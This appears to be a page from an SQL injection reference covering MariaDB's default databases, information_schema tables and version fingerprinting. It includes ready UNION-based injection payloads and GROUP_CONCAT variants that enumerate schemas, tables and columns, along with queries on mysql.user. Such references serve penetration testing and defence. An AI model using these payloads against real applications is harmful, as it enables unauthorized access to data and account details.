---
title: Default Databases
description: Information about MariaDB's default database systems
category: Basics
order: 1
tags: ["basics", "database structure"]
lastUpdated: 2025-12-18
---

MariaDB comes with several default databases that can be useful during SQL injection attacks.

| Database             | Description                                |
| -------------------- | ------------------------------------------ |
| `mysql`              | System database (requires root privileges) |
| `information_schema` | Metadata about all databases and tables    |
| `performance_schema` | Performance monitoring data                |
| `sys`                | System schema (MariaDB 10.2+)              |

The `information_schema` database contains metadata about all databases and tables on the server, making it a valuable resource for an attacker who has gained access to it.

## Listing All Databases

```sql
-- Using SHOW DATABASES
SHOW DATABASES

-- Using information_schema
SELECT SCHEMA_NAME FROM information_schema.SCHEMATA
```

## Key information_schema Tables

| Table             | Description                     |
| ----------------- | ------------------------------- |
| `SCHEMATA`        | All databases on the server     |
| `TABLES`          | All tables across all databases |
| `COLUMNS`         | All columns in all tables       |
| `ROUTINES`        | Stored procedures and functions |
| `USER_PRIVILEGES` | User privilege information      |
| `PROCESSLIST`     | Currently running processes     |

### Example Queries

```sql
-- List all tables in current database
SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA = DATABASE()

-- List all columns for a specific table
SELECT COLUMN_NAME, DATA_TYPE, COLUMN_TYPE
FROM information_schema.COLUMNS
WHERE TABLE_SCHEMA = DATABASE() AND TABLE_NAME = 'users'

-- Using SHOW commands
SHOW TABLES
SHOW COLUMNS FROM users
DESCRIBE users
```

## mysql Database Tables

The `mysql` database contains system tables. Access requires appropriate privileges.

| Table          | Description                                |
| -------------- | ------------------------------------------ |
| `user`         | User accounts and global privileges        |
| `db`           | Database-level privileges                  |
| `tables_priv`  | Table-level privileges                     |
| `columns_priv` | Column-level privileges                    |
| `proc`         | Stored procedures (MariaDB maintains this) |

```sql
-- Get user accounts (requires privileges)
SELECT Host, User FROM mysql.user

-- Check if accessible
SELECT COUNT(*) FROM mysql.user
```

## Database Enumeration Functions

```sql
-- Get current database name
SELECT DATABASE()
SELECT SCHEMA()  -- Alias for DATABASE()
```

### Current User Functions

MariaDB provides multiple functions to retrieve user information:

```sql
-- Get current user with privilege context
SELECT CURRENT_USER()

-- Get authenticated user connection information
SELECT USER()
```

Both functions are useful during reconnaissance but serve different purposes:

- `CURRENT_USER()` returns the account used to check privileges (may differ due to account matching)
- `USER()` returns the user name and host provided by the client

## Metadata Extraction via UNION Injection

### Extract Database Names

```sql
-- In UNION injection context
' UNION SELECT 1, SCHEMA_NAME FROM information_schema.SCHEMATA -- -
```

### Extract Table Names

```sql
-- Get all tables in current database
' UNION SELECT 1, TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA = DATABASE() -- -
```

### Extract Column Names

```sql
-- Get columns for specific table
' UNION SELECT 1, COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = DATABASE() AND TABLE_NAME = 'users' -- -
```

### Extract Concatenated Data

```sql
-- Get table.column format
' UNION SELECT 1, CONCAT(TABLE_NAME, '.', COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = DATABASE() -- -
```

## GROUP_CONCAT for Data Aggregation

`GROUP_CONCAT` aggregates multiple rows into a single string, useful for extracting multiple values in one query.

```sql
-- Get all database names in one result
SELECT GROUP_CONCAT(SCHEMA_NAME) FROM information_schema.SCHEMATA

-- Get all table names in current database
SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA = DATABASE()

-- Get all column names for a table
SELECT GROUP_CONCAT(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = DATABASE() AND TABLE_NAME = 'users'

-- Custom separator
SELECT GROUP_CONCAT(SCHEMA_NAME SEPARATOR '|') FROM information_schema.SCHEMATA
```

### In UNION Injection

GROUP_CONCAT can be especially powerful in UNION-based SQL injection to extract multiple values in a single result:

```sql
-- Extract all table names in one result
' UNION SELECT 1, GROUP_CONCAT(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA = DATABASE() -- -

-- Extract all database names
' UNION SELECT 1, GROUP_CONCAT(SCHEMA_NAME) FROM information_schema.SCHEMATA -- -

-- Extract all columns for a specific table
' UNION SELECT 1, GROUP_CONCAT(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = DATABASE() AND TABLE_NAME = 'users' -- -
```

## Cross-Database Queries

MariaDB allows querying tables across databases using fully qualified names:

```sql
-- Query information_schema from any database
SELECT TABLE_SCHEMA, TABLE_NAME FROM information_schema.TABLES LIMIT 5

-- Access mysql.user if privileged
SELECT Host, User FROM mysql.user

-- Fully qualified syntax: database.table
SELECT * FROM information_schema.SCHEMATA
```

## MariaDB-Specific Features

### mysql.proc Table

Unlike MySQL 8.0 which removed `mysql.proc`, MariaDB maintains this table:

```sql
-- Check stored procedures (MariaDB-specific)
SELECT * FROM mysql.proc
```

### INFORMATION_SCHEMA.SYSTEM_VARIABLES

MariaDB provides access to system variables via information_schema:

```sql
-- Get system variables
SELECT VARIABLE_NAME, VARIABLE_VALUE
FROM information_schema.SYSTEM_VARIABLES
WHERE VARIABLE_NAME = 'version'
```

### INFORMATION_SCHEMA.PLUGINS

```sql
-- List active plugins
SELECT PLUGIN_NAME, PLUGIN_STATUS
FROM information_schema.PLUGINS
WHERE PLUGIN_STATUS = 'ACTIVE'
```

### Sequences (MariaDB 10.3+)

MariaDB 10.3+ supports sequences with metadata in information_schema:

```sql
-- Check if SEQUENCES table exists
SELECT TABLE_NAME FROM information_schema.TABLES
WHERE TABLE_SCHEMA = 'information_schema' AND TABLE_NAME = 'SEQUENCES'
```

### Aria Storage Engine

Aria is MariaDB's crash-safe storage engine (replacement for MyISAM):

```sql
SHOW ENGINE ARIA STATUS
```

### Version Identification

```sql
-- @@version contains "MariaDB" identifier
SELECT @@version
-- Example: 10.6.24-MariaDB

-- Version comment shows MariaDB foundation
SELECT @@version_comment
```

## Differences from MySQL

| Feature                 | MariaDB               | MySQL 8.0             |
| ----------------------- | --------------------- | --------------------- |
| `mysql.proc` table      | Exists                | Removed               |
| `SYSTEM_VARIABLES` view | In information_schema | In performance_schema |
| `sys` database          | Available (10.2+)     | Available             |
| Sequences support       | Yes (10.3+)           | No                    |
| Aria storage engine     | Yes                   | No                    |
